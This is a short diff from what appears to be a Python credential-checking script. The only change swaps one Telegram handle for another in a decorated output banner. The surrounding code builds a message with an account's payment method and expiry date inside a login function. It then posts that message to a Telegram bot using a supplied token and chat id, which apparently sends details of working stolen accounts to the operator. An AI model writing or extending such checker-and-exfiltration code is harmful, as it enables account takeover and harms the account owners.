@@ -116,7 +116,7 @@ def login(email, pasw, tok, ID):
 ➙𝐏𝐀𝐘𝐌𝐄𝐍𝐓 𝐌𝐄𝐓𝐇𝐎𝐃 ➾ {payment}
 ➙𝐄𝐗𝐏𝐈𝐑𝐘 ➾ {expiry}
 
-⋘──────━𓆩 @TEMPMETHOD 𓆪━──────⋙ 
+⋘──────━𓆩 @RexxCheat 𓆪━──────⋙ 
 """           
                     print(f' {G}{msg}')
                     requests.post(f'https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text={msg}')
